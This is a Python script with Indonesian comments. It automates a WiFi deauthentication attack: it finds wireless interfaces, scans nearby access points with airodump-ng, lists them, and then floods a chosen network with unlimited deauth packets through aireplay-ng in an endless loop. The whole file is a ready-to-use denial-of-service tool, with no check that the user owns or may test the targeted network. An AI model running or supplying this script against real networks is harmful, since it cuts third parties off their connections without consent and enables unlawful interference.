#!/usr/bin/env python3
import subprocess
import re
import csv
import os
import time
import sys
import shutil
from icons.colors import *
from datetime import datetime
from pathlib import Path

# fallback UI kalau icons.headers tidak ditemukan
try:
    from icons.headers import clean_screen, header_tools
except Exception:
    def clean_screen():
        subprocess.call("clear", shell=True)
    def header_tools():
        print("=== WiFi Scanner + Aireplay ===")

def safe_timestamp():
    return datetime.now().strftime("%Y%m%d-%H%M%S")

def ensure_backup_dir(directory):
    backup_dir = Path(directory) / "backup"
    backup_dir.mkdir(exist_ok=True)
    return backup_dir

def latest_csv_file():
    csv_files = [f for f in os.listdir() if f.endswith(".csv")]
    if not csv_files:
        return None
    return max(csv_files, key=lambda f: os.path.getmtime(f))

def read_airodump_csv(csv_path):
    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed',
                  'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV',
                  'LAN_IP', 'ID_length', 'ESSID', 'Key']
    rows = []
    try:
        with open(csv_path, newline='', errors='ignore') as fh:
            reader = csv.DictReader(fh, fieldnames=fieldnames)
            for row in reader:
                if row["BSSID"] == "BSSID":
                    continue
                if row["BSSID"] == "Station MAC":
                    break
                if row.get("BSSID"):
                    rows.append(row)
    except Exception:
        pass
    return rows

def dedup_by_bssid(rows):
    seen = set()
    out = []
    for r in rows:
        b = r.get("BSSID")
        if b and b not in seen:
            seen.add(b)
            out.append(r)
    return out

def print_table(networks):
    print(f"{y}{'NO':<3} {'BSSID':<20} {'CH':<4} {'PWR':<4} {'ENC':<8} {'ESSID':<32}{rs}")
    print("-" * 75)
    for idx, net in enumerate(networks):
        bssid = net.get("BSSID", "")
        ch = (net.get("channel") or "").strip()
        pwr = (net.get("Power") or "").strip()
        enc = (net.get("Privacy") or "").strip()
        essid = net.get("ESSID") or "<hidden>"
        print(f"{idx:<3} {bssid:<20} {ch:<4} {pwr:<4} {enc:<8} {essid:<32}")

# --- helper baru untuk deteksi iface monitor ---
def pick_monitor_iface(base_iface):
    """
    Coba deteksi nama interface monitor yang dibuat oleh airmon-ng atau driver.
    Contoh: wlan0 -> wlan0mon, wlx00c0ca1234 -> wlx00c0ca1234mon, atau mon0
    Jika tidak ditemukan, kembalikan base_iface.
    """
    try:
        ip_out = subprocess.run(["ip", "link", "show"], capture_output=True, text=True).stdout
    except Exception:
        ip_out = ""

    candidates = []

    candidates.append(base_iface + "mon")
    candidates.append("mon" + base_iface)
    candidates.extend([f"mon{i}" for i in range(0,6)])

    for line in ip_out.splitlines():
        m = re.match(r"\d+:\s+([^:]+):\s+<", line)
        if m:
            name = m.group(1)
            if base_iface in name and "mon" in name and name not in candidates:
                candidates.append(name)
            if name.endswith("mon") and name not in candidates:
                candidates.append(name)

    for c in candidates:
        if c and (f"{c}:" in ip_out or re.search(rf"\b{re.escape(c)}\b", ip_out)):
            return c

    if base_iface and (f"{base_iface}:" in ip_out or re.search(rf"\b{re.escape(base_iface)}\b", ip_out)):
        return base_iface

    return base_iface

def run_aireplay(iface, target_bssid, channel, essid):
    clean_screen()
    print(f"{r}=== Mode Deauth ==={rs}")
    print(f"Target  : {essid} ({target_bssid})")
    print(f"Channel : {channel}")
    print(f"Adapter : {iface}\n")

    # aktifkan mode monitor (catat kalau sukses)
    print(f"{y}>>> Menyiapkan mode monitor...")
    started = False
    try:
        rc = subprocess.call(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # airmon-ng returns 0 on success usually; tapi kadang tetap sukses walau return non-zero
        started = True
    except FileNotFoundError:
        # airmon-ng tidak ada, kita lanjut tanpa start
        print(f"{r}[!] airmon-ng tidak ditemukan — lanjut as-is (harus dalam mode monitor manual).")
    except Exception:
        pass

    mon_iface = pick_monitor_iface(iface)
    print(f"{g}[+] Menggunakan interface: {r}{mon_iface}")

    # set channel via `iw` bila tersedia, fallback ke iwconfig
    try:
        subprocess.call(["iw", "dev", mon_iface, "set", "channel", str(channel)],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        try:
            subprocess.call(["iwconfig", mon_iface, "channel", str(channel)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    print(f"{r}>>> Menjalankan deauth attack (Ctrl+C untuk berhenti)...{rs}\n")
    try:
        while True:
            # gunakan aireplay-ng; jika tidak ada, break
            try:
                subprocess.call(["aireplay-ng", "--deauth", "0", "-a", target_bssid, mon_iface])
            except FileNotFoundError:
                print(f"{r}[!] aireplay-ng tidak ditemukan di sistem. Install aircrack-ng package.")
                break
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n\n{r}[!] Deauth dihentikan oleh pengguna.")
    finally:
        # stop monitor jika kita menyalakannya
        if started:
            try:
                subprocess.call(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"\n{g}[+] Monitor mode dimatikan. Kembali ke mode managed.")
            except Exception:
                pass

def detect_interfaces():
    """
    Deteksi interface wireless dengan beberapa metode:
    1) `iw dev`
    2) `ip link show` (filter wl*, wlan*, wlp*, wlx*)
    3) `iwconfig` (legacy) sebagai fallback
    Mengembalikan list interface nama (unik).
    """
    interfaces = []

    # 1) iw dev
    try:
        iw_dev = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        if iw_dev:
            found = re.findall(r"Interface\s+([^\s]+)", iw_dev)
            for f in found:
                if f not in interfaces:
                    interfaces.append(f)
    except Exception:
        pass

    # 2) ip link (filter nama wireless umum)
    if not interfaces:
        try:
            ip_link = subprocess.run(["ip", "link", "show"], capture_output=True, text=True).stdout
            # ambil nama-nama interface
            found = re.findall(r"\d+:\s+([^:]+):\s+<", ip_link)
            for name in found:
                if name.startswith(("wl", "wlan", "wlp", "wlx", "mon")) and name not in interfaces:
                    interfaces.append(name)
        except Exception:
            pass

    # 3) iwconfig sebagai fallback (legacy)
    if not interfaces:
        try:
            iw_output = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
            wlan_pattern = re.compile(r"^(wlan[0-9]+|wlp[0-9a-zA-Z]+|wlx[0-9a-zA-Z]+)", re.MULTILINE)
            found = wlan_pattern.findall(iw_output)
            for f in found:
                if f not in interfaces:
                    interfaces.append(f)
        except Exception:
            pass

    return interfaces

def main():
    time.sleep(0.5)
    clean_screen()
    header_tools()

    if os.geteuid() != 0:
        print(f"{r}[!] Jalankan skrip ini dengan sudo/root.")
        return

    cwd = os.getcwd()
    backup_dir = ensure_backup_dir(cwd)

    for fname in os.listdir():
        if fname.endswith(".csv"):
            dst = backup_dir / f"{safe_timestamp()}-{fname}"
            try:
                shutil.move(fname, dst)
                print(f"{g}[+] Backup {fname} -> {dst}")
            except Exception:
                pass

    print(f"\n{y}[*]{rs} Mendeteksi interface WiFi...")
    print("-"*40)
    time.sleep(1)

    interfaces = detect_interfaces()

    if not interfaces:
        print(f"{r}[!] Tidak menemukan interface WiFi. Pastikan adapter terpasang, atau install 'iw' / 'wireless-tools'.")
        print(f"{r}    Di Parrot: `sudo apt install iw` atau `sudo apt install wireless-tools` (untuk iwconfig).")
        return

    for i, iface in enumerate(interfaces):
        print(f"{g}[{i}] - {iface}")

    while True:
        try:
            time.sleep(0.2)
            sel = input(f"\n{y}[?]{rs} Pilih interface (angka): ").strip()
            try:
                idx = int(sel)
                iface = interfaces[idx]
                break
            except (ValueError, IndexError):
                print(f"{r}[!] Masukkan angka yang valid.")
        except KeyboardInterrupt:
            time.sleep(0.5)
            print(f"{r}\n[!] Proses dibatalkan")
            time.sleep(0.5)
            sys.exit()

    print(f"\n{g}[+] Interface terpilih: {iface}")

    # pakai interface monitor yang valid untuk airodump
    mon_iface = pick_monitor_iface(iface)

    print(f"\n{y}[*]{rs} Menjalankan airodump-ng... Tekan Ctrl+C untuk berhenti.")
    try:
        # gunakan mon_iface — jika bukan monitor mode, airodump bisa tetap jalan tapi data terbatas
        airodump = subprocess.Popen([
            "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", mon_iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"{r}[!] Gagal menjalankan airodump-ng: {e}")
        return

    spinner = ["|", "/", "-", "\\"]
    idx_spin = 0
    active = []

    try:
        while True:
            clean_screen()
            header_tools()
            print(f"\n{y}[*]{rs} Memindai jaringan WiFi di sekitar...")
            print(f"{y}({spinner[idx_spin % 4]}){rs} Tekan Ctrl+C untuk berhenti.\n")
            idx_spin += 1

            csv_file = latest_csv_file()
            if csv_file:
                rows = read_airodump_csv(csv_file)
                active = dedup_by_bssid(rows)
                if active:
                    print_table(active)
                    print(f"\n{g}[{len(active)}] access point terdeteksi.")
                else:
                    print(f"{r}[!] Belum ada AP terdeteksi.")
            else:
                print(f"{y}[*] Menunggu file CSV dibuat...")

            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{r}[!] Pemindaian dihentikan oleh pengguna.")

    try:
        airodump.terminate()
        airodump.wait(timeout=3)
    except Exception:
        try:
            airodump.kill()
        except Exception:
            pass

    if not active:
        print(f"{r}[!] Tidak ada jaringan yang bisa dipilih.")
        return

    while True:
        try:
            choice = input(f"\n{y}[?]{rs} Pilih nomor jaringan untuk {r}DEAUTH{rs} : ").strip()
            try:
                idx_choice = int(choice)
                if 0 <= idx_choice < len(active):
                    break
                else:
                    print(f"{r}[!] Index di luar jangkauan.")
            except ValueError:
                print(f"{r}[!] Masukkan angka yang valid.")
        except KeyboardInterrupt:
            time.sleep(0.5)
            print(f"\n{r}[!] Proses dibatalkan")
            time.sleep(0.5)
            sys.exit()

    sel = active[idx_choice]
    bssid = sel.get('BSSID')
    channel = sel.get('channel')
    essid = sel.get('ESSID') or "<hidden>"

    run_aireplay(iface, bssid, channel, essid)

if __name__ == "__main__":
    main()
